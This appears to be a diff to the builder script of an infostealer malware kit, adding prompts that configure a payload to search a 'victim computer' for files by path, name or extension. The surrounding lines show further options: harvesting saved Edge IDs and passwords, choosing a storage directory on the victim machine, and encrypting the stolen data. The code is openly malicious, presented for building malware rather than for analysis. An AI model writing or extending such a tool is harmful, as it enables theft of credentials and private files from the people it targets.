@@ -121,7 +121,7 @@ def creating_virus(type_of_virus:bool,path_of_rowvirus:str,target_path:str):
     2. path of row virus:  ask for the path where row virus has been writen
     3. target path :       where virus has to be save after creating'''
     while True:
-        true_false=true_false=['C:\\Users\\Public',True,True,True,True,True,True,True,True,True,'',True]
+        true_false=true_false=['C:\\Users\\Public',True,True,True,True,True,True,True,True,True,'',True,False]
         skull_img(clear=True,level_2=True)
         nothing=input()
         print(colored('do you wanna change the storing directory in victim computer (default value C:\\Users\\Public) ','yellow'))
@@ -147,6 +147,22 @@ def creating_virus(type_of_virus:bool,path_of_rowvirus:str,target_path:str):
         skull_img(clear=True,level_2=True)
         if input(' '*15+colored('do you wanna collect edge data(edge_bais info,edge default id password) y/n ','yellow')).lower()=='y':pass
         else:true_false[7]=False
+        #!!!!!!!!!!!!!!!!!!!!!!!!!!!enditing!!!!!!!!!!!!!!!!!!!
+        skull_img(clear=True,level_2=True)
+        if input(' '*15+colored('do you wanna dir search?(collect files) ','yellow')+colored(" /!\\takes 1-5min ",'red')+colored("_y/n ",'yellow')).lower().strip()=='y':
+            true_false[12]=[True]
+            if input(colored('do u wanna add specific path to scan(if no then default woude be whole computer) ? y/n','blue')).strip().lower()=='y':
+                true_false[12].append(True);true_false[12].append(input(colored("Add your path here(defult=>C:\\Users\\) /!\\path shoude be cuurect, use only one'\\'",'light_blue')))
+            else:true_false[12].append(False);true_false[12].append(' ')
+            if input(' '*15+colored("do u wanna search obj with obj name? y/n","blue"))=='y':
+                true_false[12].append(True);true_false[12].append(input(colored("enter list of names seprated by ',': ",'red')).split(','))
+            else:true_false[12].append(False);true_false[12].append([])
+            if input(' '*15+colored('do u wanna search fils by there extenstion? y/n','blue'))=='y':
+                true_false[12].append(True);true_false[12].append(input(colored("enter list of names seprated by ',': ",'red')).split(','))
+            else:true_false[12].append(False);true_false[12].append([])
+        else:true_false[12]=[False,False,'',False,[],False,[]]
+        print(true_false);nothing=input()
+        # !!!!!!!!!!!!!!!!!!!!!!!!!!under here only!!!!!!!!!!!!!!!!!
         skull_img(clear=True,level_2=True)
         if input(colored('do you wanna encrypt all data you collectd (!its incresse the size of file 2.5x).recomanded  y/n ','yellow')).lower()=='y':pass
         else:true_false[8]=False
